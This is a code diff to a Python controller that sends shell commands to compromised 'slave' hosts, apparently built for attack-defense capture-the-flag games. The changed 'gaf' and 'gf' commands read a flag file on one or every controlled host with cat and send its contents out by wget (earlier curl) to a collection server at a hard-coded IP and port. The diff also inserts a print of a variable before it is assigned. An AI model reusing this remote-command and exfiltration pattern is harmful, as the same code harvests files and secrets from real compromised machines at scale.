@@ -116,12 +116,12 @@ class Slave():
 
     def location(self, host):
         try:
-            response = requests.get("http://ip.taobao.com/service/getIpInfo.php?ip=%s" % (host), timeout=0.5)
-            content = response.content
-            return json.loads(content)["data"]
-        except Exception as e:
-            Log.error(str(e))
-            return {"data":"error", 'country': 'Unknown_country','isp': 'Unknown_isp','area': 'Unknown_area','region': 'Unknown_region','city': 'Unknown_city',}
+        #     response = requests.get("http://ip.taobao.com/service/getIpInfo.php?ip=%s" % (host), timeout=0.5)
+        #     content = response.content
+        #     return json.loads(content)["data"]
+        # except Exception as e:
+        #     Log.error(str(e))
+        return {"data":"error", 'country': 'Unknown_country','isp': 'Unknown_isp','area': 'Unknown_area','region': 'Unknown_region','city': 'Unknown_city',}
 
     def show_info(self):
         Log.info("Hash : %s" % (self.node_hash))
@@ -384,16 +384,17 @@ def main():
             EXEC_LOCAL = False
         elif command == "gaf":
             flag_path = raw_input(
-                "Input flag path (/flag.txt) : ") or ("/flag.txt")
+                "Input flag path (/flag) : ") or ("/flag")
             box_host = raw_input("Input flag box host (192.168.187.128) : ") or (
                 "192.168.187.128")
-            box_port = int(raw_input("Input flag box host (80) : ") or ("80"))
+            box_port = int(raw_input("Input flag box host (62088) : ") or ("62088"))
             for i in slaves.keys():
+                print(slave)
                 slave = slaves[i]
-                cmd = "FLAG=`cat %s | base64`" % (flag_path)
+                cmd = "FLAG=`cat %s`" % (flag_path)
                 Log.info("Command : %s" % (cmd))
                 result = slave.send_command(cmd)
-                cmd = "curl \"http://%s:%d/?flag=${FLAG}\"" % (
+                cmd = "wget -q -T 2 -t 2 -O- \"http://%s:%d/flag/${FLAG}\"" % (
                     box_host, box_port)
                 Log.info("Command : %s" % (cmd))
                 result = slave.send_command(cmd)
@@ -406,14 +407,14 @@ def main():
                     Log.info("Position changed to : %s" % (position))
         elif command == "gf":
             flag_path = raw_input(
-                "Input flag path (/flag.txt) : ") or ("/flag.txt")
+                "Input flag path (/flag) : ") or ("/flag")
             box_host = raw_input("Input flag box host (192.168.187.128) : ") or (
                 "192.168.187.128")
-            box_port = int(raw_input("Input flag box host (80) : ") or ("80"))
-            cmd = "FLAG=`cat %s | base64`" % (flag_path)
+            box_port = int(raw_input("Input flag box host (62088) : ") or ("62088"))
+            cmd = "FLAG=`cat %s`" % (flag_path)
             Log.info("Command : %s" % (cmd))
             result = current_slave.send_command(cmd)
-            cmd = "curl \"http://%s:%d/?flag=${FLAG}\"" % (
+            cmd = "wget -q -T 2 -t 2 -O- \"http://%s:%d/flag/${FLAG}\"" % (
                 box_host, box_port)
             Log.info("Command : %s" % (cmd))
             result = current_slave.send_command(cmd)
